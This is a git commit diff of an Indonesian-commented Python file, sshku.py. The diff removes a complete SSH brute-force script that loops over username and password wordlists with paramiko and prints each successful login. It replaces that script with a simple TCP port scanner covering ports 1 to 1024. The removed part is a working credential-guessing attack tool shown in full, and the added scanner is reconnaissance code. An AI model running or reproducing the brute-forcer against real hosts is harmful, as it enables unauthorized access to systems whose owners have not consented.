538efcdfc6474db721faa6916ec6a60fea4f170b
FII14 <121723975+FII14@users.noreply.github.com>
2023-07-15 11:01:59 +0700

    Update sshku.py

--- sshku.py
+++ sshku.py
@@ -1,56 +1,37 @@
-import os
-import paramiko
+import socket
 
-# Konfigurasi host SSH
-alamat_host = input("Masukkan alamat host SSH: ")
-port_ssh = int(input("Masukkan port SSH: "))
+def scan_port(host, port):
+    try:
+        # Membuat objek socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Mengatur waktu timeout menjadi 1 detik
+        sock.settimeout(1)
+        # Mencoba melakukan koneksi ke host dan port tertentu
+        result = sock.connect_ex((host, port))
+        # Jika koneksi berhasil, port terbuka
+        if result == 0:
+            print(f"Port {port} terbuka")
+        else:
+            print(f"Port {port} tertutup")
+        # Menutup socket
+        sock.close()
 
-# Memeriksa keberadaan file wordlist username
-file_username = input("Masukkan nama file wordlist username: ")
-if not os.path.isfile(file_username):
-    print(f"File {file_username} tidak ditemukan.")
-    exit()
+    except socket.error:
+        print(f"Terjadi kesalahan saat mencoba terhubung ke {host} pada port {port}")
 
-# Memeriksa keberadaan file wordlist password
-file_password = input("Masukkan nama file wordlist password: ")
-if not os.path.isfile(file_password):
-    print(f"File {file_password} tidak ditemukan.")
-    exit()
+def main():
+    host = input("Masukkan alamat host yang ingin dipindai: ")
+    try:
+        # Resolving alamat host ke alamat IP
+        target_ip = socket.gethostbyname(host)
+        print(f"Memindai port pada {host} ({target_ip})...")
+        # Menjalankan fungsi scan_port() untuk memindai beberapa port
+        for port in range(1, 1025):
+            scan_port(target_ip, port)
 
-# Baca file wordlist username
-with open(file_username, "r", encoding="latin1") as file:
-    daftar_username = file.read().splitlines()
+    except socket.gaierror:
+        print("Alamat host tidak valid atau tidak dapat dijangkau")
 
-# Baca file wordlist password
-with open(file_password, "r", encoding="latin1") as file:
-    daftar_password = file.read().splitlines()
-
-# Coba setiap kombinasi username dan password
-for username in daftar_username:
-    for password in daftar_password:
-        try:
-            # Buat koneksi SSH dengan timeout default 10 detik
-            client = paramiko.SSHClient()
-            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            client.connect(alamat_host, port_ssh, username, password, timeout=10)
-
-            # Jika berhasil login, tampilkan pesan sukses
-            print(f"Login berhasil - Host: {alamat_host}, Username: {username}, Password: {password}")
-
-            # Lakukan tindakan setelah login sukses
-            # ...
-
-            # Tutup koneksi SSH
-            client.close()
-
-        except paramiko.AuthenticationException:
-            # Jika gagal login, tampilkan pesan gagal
-            print(f"Gagal login - Host: {alamat_host}, Username: {username}, Password: {password}")
-
-        except paramiko.SSHException as e:
-            # Penanganan kesalahan koneksi SSH
-            print(f"Kesalahan koneksi SSH - {str(e)}")
-
-        except Exception as e:
-            # Penanganan kesalahan umum
-            print(f"Terjadi kesalahan - {str(e)}")
+if __name__ == "__main__":
+    main()
+    
